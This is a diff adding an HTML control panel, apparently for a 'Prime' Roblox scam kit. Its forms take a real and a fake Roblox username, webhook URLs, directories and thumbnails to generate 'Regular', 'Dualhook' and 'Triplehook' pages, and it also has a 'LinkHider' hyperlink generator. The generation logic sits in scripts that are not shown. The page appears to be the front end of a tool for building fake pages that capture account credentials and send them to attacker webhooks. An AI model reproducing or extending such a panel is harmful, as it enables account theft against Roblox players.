@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+	<style>
+	body,
+	html {
+		background: rgb(24, 24, 28) !important;
+	}
+	</style>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Create</title>
+	<!-- CSS / Bootstrap -->
+	<link href="/controlPage/new/assets/css/imports.css" rel="stylesheet">
+	<!-- SNACKBAR -->
+	<link rel="stylesheet" href="/controlPage/new/assets/css/snackbar.css" />
+	<script src="/controlPage/new/assets/js/snackbar.js"></script>
+	<style>
+	    .swal2-container {
+	        z-index: 20000 !important;
+	    }
+	</style>
+</head>
+
+<body>
+	<section id="login" name="regular" class="form">
+		<div class="container h-100">
+			<div class="row justify-content-center align-items-center h-100">
+				<div class="col-md-10 col-lg-5">
+					<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
+						<center><h3>Prime</h3><h2>Generate a Regular site</h2></center>
+						<!-- LOGIN FORM -->
+						<form method="post" id="login-form">
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-user"></i>
+								<input class="auth-input" type="text" placeholder="Roblox Username" id="RealUsername" required> </div>
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-user"></i>
+								<input class="auth-input" type="text" placeholder="Fake Username" id="FakeUsername" required> </div>
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-gear"></i>
+								<input class="auth-input" type="text" placeholder="Webhook" id="Webhook" required> </div>
+							<button type="button" class="button primary d-block mt-3 w-100" onclick="Regular(this);" style="color:black">Generate</button>
+						</form>
+						<!-- ~LOGIN FORM -->
+					</div>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(2);" style="color:black"><i class="fa-solid fa-repeat" style="color:black"></i> Hyperlink (LinkHider) Generator</button></center>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(0);" style="color:black"><i style="color:black" class="fa-solid fa-repeat"></i> Triplehook Generator</button></center>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(3);" style="color:black"><i style="color:black" class="fa-solid fa-repeat"></i> Dualhook Generator</button></center>
+					
+					
+				</div>
+			</div>
+		</div>
+		<div class="overlay-top-right"></div>
+		<div class="overlay-bottom-right"></div>
+		<div class="overlay-bottom-left"></div>
+	</section>
+	<section id="login" name="dualhook" class="form" style="display:none;">
+		<div class="container h-100">
+			<div class="row justify-content-center align-items-center h-100">
+				<div class="col-md-10 col-lg-5">
+					<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
+						<center><h3>Prime</h3><h2>Generate a Dualhook Page</h2></center>
+						<!-- LOGIN FORM -->
+						<form method="post" id="login-form">
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-folder"></i>
+								<input class="auth-input" type="text" placeholder="Directory" id="Directory" required> </div>
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-signature"></i>
+								<input class="auth-input" type="text" placeholder="Name" id="Name" required> </div>
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-image"></i>
+								<input class="auth-input" type="text" placeholder="Thumbnails" id="Thumbnails" required> </div>
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-gear"></i>
+								<input class="auth-input" type="text" placeholder="Webhook" id="WebhookDualhook" required> </div>
+						    <div class="form-input-icon mb-3 mt-4"> <i class="fas fa-paintbrush"></i>
+									<input type="color" class="auth-input" id="EmbedColor"> </div>
+							<button type="button" class="button primary d-block mt-3 w-100" onclick="Dualhook(this);" style="color:black">Generate</button>
+						</form>
+						<!-- ~LOGIN FORM -->
+					</div>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(2);" style="color:black"><i class="fa-solid fa-repeat" style="color:black"></i> Hyperlink (LinkHider) Generator</button></center>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(0);" style="color:black"><i style="color:black" class="fa-solid fa-repeat"></i> Triplehook Generator</button></center>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(1);" style="color:black"><i class="fa-solid fa-repeat" style="color:black"></i> Regular Generator</button></center>
+					
+					
+				</div>
+			</div>
+		</div>
+		<div class="overlay-top-right"></div>
+		<div class="overlay-bottom-right"></div>
+		<div class="overlay-bottom-left"></div>
+	</section>
+	<section id="login" name="triplehook" class="form" style="display:none;">
+		<div class="container h-100">
+			<div class="row justify-content-center align-items-center h-100">
+				<div class="col-md-10 col-lg-5">
+					<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
+						<center><h3>Prime</h3><h2>Generate a Triplehook Page</h2></center>
+						<!-- LOGIN FORM -->
+						<form method="post" id="login-form">
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-folder"></i>
+								<input class="auth-input" type="text" placeholder="Directory" id="DirectoryTriple" required> </div>
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-gear"></i>
+								<input class="auth-input" type="text" placeholder="Webhook" id="WebhookTriple" required> </div>
+							<button type="button" class="button primary d-block mt-3 w-100" onclick="Triplehook(this);" style="color:black">Generate</button>
+						</form>
+						<!-- ~LOGIN FORM -->
+					</div>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(2);" style="color:black"><i class="fa-solid fa-repeat" style="color:black"></i> Hyperlink (LinkHider) Generator</button></center>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(3);" style="color:black"><i style="color:black" class="fa-solid fa-repeat"></i> Dualhook Generator</button></center>
+					<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(1);" style="color:black"><i class="fa-solid fa-repeat" style="color:black"></i> Regular Generator</button></center>
+					
+					
+				</div>
+			</div>
+		</div>
+		<div class="overlay-top-right"></div>
+		<div class="overlay-bottom-right"></div>
+		<div class="overlay-bottom-left"></div>
+	</section>
+	<section id="login" name="hyperlink" class="form" style="display:none;">
+		<div class="container h-100">
+			<div class="row justify-content-center align-items-center h-100">
+				<div class="col-md-10 col-lg-5">
+					<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
+						<center><h3>Prime</h3><h2>Generate a HyperLink</h2></center>
+						<!-- LOGIN FORM -->
+						<form method="post" id="login-form">
+							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-link"></i>
+								<input class="auth-input" type="text" placeholder="Link" id="Link" required> </div>
+							<button type="button" class="button primary d-block mt-3 w-100" onclick="Hyperlink(this);" style="color:black">Generate</button>
+						</form>
+						<!-- ~LOGIN FORM -->
+					</div>
+										<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(0);" style="color:black"><i style="color:black" class="fa-solid fa-repeat"></i> Triplehook Generator</button></center>
+<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(3);" style="color:black"><i style="color:black" class="fa-solid fa-repeat"></i> Dualhook Generator</button></center>
+<center><button type="button" class="button primary d-block mt-3 w-80" onclick="Switch(1);" style="color:black"><i class="fa-solid fa-repeat" style="color:black"></i> Regular Generator</button></center>
+				</div>
+			</div>
+		</div>
+		<div class="overlay-top-right"></div>
+		<div class="overlay-bottom-right"></div>
+		<div class="overlay-bottom-left"></div>
+	</section>
+	<script>
+	    function Switch(option){
+		document.getElementsByName("triplehook")[0].style.display="none"
+		document.getElementsByName("hyperlink")[0].style.display="none"
+		document.getElementsByName("regular")[0].style.display="none"
+		document.getElementsByName("dualhook")[0].style.display="none"
+	        if(option == 0){
+	            document.getElementsByName("triplehook")[0].style.display="block"
+	        }else if(option == 1){
+	            document.getElementsByName("regular")[0].style.display="block"	        
+		}else if(option == 2){
+	            document.getElementsByName("hyperlink")[0].style.display="block"
+	        }
+		else if(option == 3){
+	            document.getElementsByName("dualhook")[0].style.display="block"
+	        }
+
+
+	    }
+	</script>
+	<script src="apis/main.js"></script>
+	<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+	<script src="js/jquery-3.3.1.min.js"></script>
+	<script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
+	<script src="new/assets/js/bootstrap.js"></script>
+	<script src="new/assets/js/core.js"></script>
+	<link rel="stylesheet" href="@sweetalert2/themes/dark/dark.css">
+</body>
+
+</html>
